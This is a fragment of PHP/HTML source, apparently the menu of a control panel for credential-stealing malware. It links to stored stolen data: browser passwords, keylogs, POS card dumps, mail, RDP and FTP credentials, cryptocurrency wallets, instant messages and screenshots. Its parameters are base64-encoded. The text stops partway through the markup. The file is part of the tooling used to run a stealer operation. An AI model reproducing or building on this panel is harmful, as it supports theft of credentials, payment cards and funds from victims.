<?php 
    error_reporting(0);
    session_start();
	require_once('config.php');
    require_once('session.php');
?>	

<ul>
	<li><a href="home.php?m=dashboard" id="contact-link" class="skel-panels-ignoreHref"><span class="icon icon-home">Home</span></a>
	<li><a href="clients.php" id="top-link" class="skel-panels-ignoreHref"><span class="icon icon-group">Clients</span></a></li>
	<li><a href="tasks.php" id="portfolio-link" class="skel-panels-ignoreHref"><span class="icon icon-tasks">Tasks</span></a></li>
	<li><a href="statistics.php" id="about-link" class="skel-panels-ignoreHref"><span class="icon icon-th">Statistics</span></a></li>
	<li><a href="#" onclick="swap('sectionOneLinks');return false;" id="contact-link" class="skel-panels-ignoreHref"><span class="icon icon-copy">Reports</span></a>
		<ul id="sectionOneLinks" style="display: none;" class="icons">
		  <table boder="0" width="100%">
			<tr>
			 	<td width=100><center><a href="reports.php?p=<?=base64_encode($folder.'/pass')?>" title="Browser Passwords" class="icon icon-key"><span></span></center></td>
				<td width=100><center><a href="reports.php?p=<?=base64_encode($folder.'/kyl')?>" title="Keylogs" class="icon icon-keyboard"><span></span></center></td>
				<td width=100><center><a href="reports.php?p=<?=base64_encode($folder.'/dump')?>" title="POS Data" class="icon icon-credit-card"><span></span></center></td>
			</tr>
			<tr>
	  			<td width=100><center><a href="reports.php?p=<?=base64_encode($folder.'/mail')?>" title="Mails, POP3, IMAP " class="icon icon-envelope"><span></span></center></td>
				<td width=100><center><a href="reports.php?p=<?=base64_encode($folder.'/rdp')?>" title="RDP" class="icon icon-desktop"><span></span></center></td>
				<td width=100><center><a href="reports.php?p=<?=base64_encode($folder.'/ftp')?>" title="FTP" class="icon icon-link"><span></span></center></td>
			</tr>
			<tr>
				<td width=100><center><a href="reports.php?p=<?=base64_encode($folder.'/wallet')?>" title="Wallet Stealer" class="icon icon-btc"><span></span></center></td>
				<td width=100><center><a href="reports.php?p=<?=base64_encode($folder.'/ins')?>" title="Instant messaging" class="icon icon-comments"><span></span></center></td>
				<td width=100><center><a href="reports.php?cmd=Z2FsbGVyeQ==" title="Screenshots" class="icon icon-screenshot"><span></span></center></td>
			</tr>
		  </table>
		</ul>